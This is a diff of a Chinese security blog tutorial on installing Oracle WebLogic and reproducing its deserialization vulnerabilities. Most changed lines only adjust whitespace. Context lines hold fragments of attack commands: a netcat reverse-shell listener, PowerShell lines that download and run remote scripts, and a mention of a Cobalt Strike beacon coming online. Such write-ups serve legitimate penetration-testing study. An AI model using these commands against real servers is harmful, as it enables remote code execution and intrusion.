@@ -12,13 +12,13 @@ source: "MrWQ/vulnerability-paper"
 
 由于传播、利用本公众号狐狸说安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号狐狸说安全及作者不为**此**承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！
 
-### **0x01 **Weblogic 简介****
+### **0x01 **Weblogic 简介****
 
 Weblogic 是美国 Oracle 公司出品的应用服务器软件，确切的说这是基于 Java EE 架构的中间件，主要用于开发、继承、部署和管理大型分布式 web 应用、网络应用和数据库应用。Weblogic 将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的 Java 应用服务器软件之一，也是世界上第一个成功商业化的 Java EE 应用服务器，当然 Weblogic 具有可扩展性、快速开发、灵活可靠等优势，其默认端口为 7001，目前比较活跃的版本为 10 和 12，最新版本为 14。
 
 在功能性上，Weblogic 是 Java EE 的全能应用服务器，包括 EJB、JSP、servlet、JMS 等，是商业软件中排名第一的容器（JSP、servlet、EJB 等），并提供其他工具（例如 Java 编辑器），因此也是一个综合的开发以及运行环境。在扩展性上，Weblogic Server 凭借出色的群集技术，拥有处理关键 web 应用系统问题所需的性能、扩展性和高可用性。Weblogic Server 既实现了网页集群，也实现了 EJB 组件群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错。无论是网页群集还是组建群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。
 
-### **0x02 **Weblogic 安装****
+### **0x02 **Weblogic 安装****
 
 ```
 下载地址：https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.htm
@@ -126,39 +126,39 @@ java -jar fmw_12.1.3.0.0_wls.jar
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibib1QtCOch3cwZ9Y8FEAuCxmw0cOSqXunR2jLZwSiaBykWpjgLxeQUjbQ/640?wx_fmt=png)
 
-2、一直下一步到此点击安装完成 
+2、一直下一步到此点击安装完成 
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibSzr8EU4p9Yb3R178dlJGxibTJLznNgWIg1KjIvIpneOvpfEpNicKpvBA/640?wx_fmt=png)
 
-3、开始配置 Weblogic 域 
+3、开始配置 Weblogic 域 
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibRhmY9jZ8TnqK4Pt620FNKMK9u1axqjbBRELFmRr2qYDWqoPhu5uqAg/640?wx_fmt=png)
 
-4、设置账号密码为 weblogic/admin123. 
+4、设置账号密码为 weblogic/admin123. 
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibsJZciclISPrKqcicWTQ2l5NhMPXM0lrNGK4biagQ4RAl6N21JeulKsP0Q/640?wx_fmt=png)
 
-5、选择生产模式 
+5、选择生产模式 
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibvYia5z7INr2otlBPNTXUHXKwibzIQn1O5mzcf7icIxIibrKiaLiblknyhPibw/640?wx_fmt=png)
 
-6、配置节点管理器和管理服务器 
+6、配置节点管理器和管理服务器 
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibG9ykrNU96yjKgIuf65o7IsjJf60gOQKicPsQialWevQoWDRx3SmYBnWQ/640?wx_fmt=png)
 
-7、选择默认管理服务器配置 
+7、选择默认管理服务器配置 
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibFVnXfO2T2q5ibmLglPuu4ibBCpWN3BO3cLteVKGUibw0eicq9kibO4Yraw/640?wx_fmt=png)
 
-8、一直下一步即可安装完成 
+8、一直下一步即可安装完成 
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibUuIGDaMNmoDTJsT0kCgXcgw02hj9YONcrYiaicK93ia3WnJictL1CNooRg/640?wx_fmt=png)
 
-9、找到启动 cmd 文件，点击后开启 Weblogic 
+9、找到启动 cmd 文件，点击后开启 Weblogic 
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibq37cWBCDfa4mFWGN2ONrNeOZTFQ291NdnXq3eXeCSFrB3Nn4Wics4LA/640?wx_fmt=png)
 
-10、运行需输入之前的账号密码 
+10、运行需输入之前的账号密码 
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib4Hqn2uXla0y6uW4mUJSDAoLxYhtTr0oMC8qlZIwPUApEhr82srHSDg/640?wx_fmt=png)
 
@@ -170,7 +170,7 @@ java -jar fmw_12.1.3.0.0_wls.jar
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibvibjWjy7WkKdKEYUKVY5PIBWhgzAiaQhXBns2aPBbfcuGgESicyMCKvUw/640?wx_fmt=png)
 
-### **0x03 **Weblogic 漏洞复现****
+### **0x03 **Weblogic 漏洞复现****
 
 **XMLDecoder 反序列化漏洞（CVE-2017-10271 & CVE-2017-3506）**
 
@@ -658,7 +658,7 @@ xmlns:asy="http://www.bea.com/async/AsyncResponseService">
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibvkeeBoxqgOKghzg43W9tvmVg2YvQ43INmvD0nYgAAs5RPNDoIw7Vew/640?wx_fmt=png)
 
-  成功上线 CS
+  成功上线 CS
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibbRZViabs4DxBbTTevRpH877VTPxFW1SVRUDoPtRViaLjqSzuib9Vp8JmQ/640?wx_fmt=png)
 
@@ -1042,7 +1042,7 @@ nc -nvlp 6666
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibpUibpuD2P3CwyE8KEfUrU6KG65TfYa10oagoibfzm6UZVSp1Ydyibw2xg/640?wx_fmt=png)
 
-    部署成功后存在该应用并点击启动
+    部署成功后存在该应用并点击启动
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibGGSj6SpoEVtINRCUWB4FY14xiaRufeWmhCZgmQicPZmTP6uHwAK6N6w/640?wx_fmt=png)
 
@@ -1350,7 +1350,7 @@ IEX (New-Object System.Net.Webclient).DownloadString('http://www.naturali5r.cn/p
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibgCyKwXsLibbg3VrZEsWrSpY41xS1FZiauZRj9EFSVyibUoBicn5V2rthkw/640?wx_fmt=png)
 
-启动攻击所需要的 LDAP 利用脚本，其中 - i 指向当前服务器 IP 
+启动攻击所需要的 LDAP 利用脚本，其中 - i 指向当前服务器 IP 
 
 脚本地址：  
 
@@ -1402,7 +1402,7 @@ powershell /c (new-object System.Net.WebClient).DownloadFile('http://192.168.0.1
 
 4. 升级官方安全补丁
 
-### **0x04 **知识星球****
+### **0x04 **知识星球****
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/pH5fZ5lvwwZjRbPjHMwuywOjARoC8AlmuhOC1cKYYfDib2F2ibZkTpxEwic5mib3pKaaOKa6DDKwLMMibVKmxth4ogQ/640?wx_fmt=jpeg)
 
